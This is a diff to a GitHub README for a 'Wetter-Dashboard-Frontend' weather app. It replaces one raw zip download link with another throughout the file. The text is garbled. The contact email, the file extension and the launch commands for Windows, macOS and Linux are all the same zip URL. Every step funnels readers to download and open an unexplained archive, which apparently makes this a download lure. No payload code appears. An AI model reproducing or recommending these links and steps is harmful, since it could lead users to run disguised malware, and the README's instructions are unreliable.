@@ -1,6 +1,6 @@
 # 🌦️ Wetter-Dashboard-Frontend- - Simple Weather Dashboard for Your Cities
 
-[![Download Here](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip)
+[![Download Here](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip)
 
 ## 📦 Overview
 
@@ -18,18 +18,18 @@ Follow these steps to download and run Wetter-Dashboard-Frontend-.
 ### 2. **Visit the Download Page**
 Go to the Releases page to obtain the latest version of the application.
 
-[Download Here](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip)
+[Download Here](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip)
 
 ### 3. **Download the Application**
-On the Releases page, find the latest release. Click on the asset that matches your operating system. It might be labeled with the version number followed by the file extension (.zip or https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip).
+On the Releases page, find the latest release. Click on the asset that matches your operating system. It might be labeled with the version number followed by the file extension (.zip or https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip).
 
 ### 4. **Extract the Files**
 After downloading, extract the files from the downloaded archive. Right-click the file and select "Extract All" or use your preferred extraction tool.
 
 ### 5. **Open the Application**
-- For Windows: Open the folder containing the extracted files and double-click `https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip`.
-- For macOS: Open the folder and double-click `https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip` to launch it in your default browser.
-- For Linux: Open your terminal, navigate to the folder, and use the command `xdg-open https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip` to run it.
+- For Windows: Open the folder containing the extracted files and double-click `https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip`.
+- For macOS: Open the folder and double-click `https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip` to launch it in your default browser.
+- For Linux: Open your terminal, navigate to the folder, and use the command `xdg-open https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip` to run it.
 
 ## 🔍 Features
 
@@ -61,7 +61,7 @@ If you run into issues:
 
 ## 📱 Contact and Support
 
-Need help? Open an issue on the GitHub repository, and I’ll do my best to assist you. You can also reach out by email at https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip
+Need help? Open an issue on the GitHub repository, and I’ll do my best to assist you. You can also reach out by email at https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip
 
 ## 🗂️ Contribution
 
@@ -76,6 +76,6 @@ Want to contribute? Great! Follow these steps:
 
 Now, you are ready to start using Wetter-Dashboard-Frontend-. Make sure to return to the Releases page to download any updates.
 
-[Download Here](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/dioeciously/Wetter-Dashboard-Frontend-.zip)
+[Download Here](https://raw.githubusercontent.com/roser800/Wetter-Dashboard-Frontend-/main/pages/Dashboard-Frontend-Wetter-v1.5.zip)
 
 Feel free to explore, and enjoy your new weather dashboard!
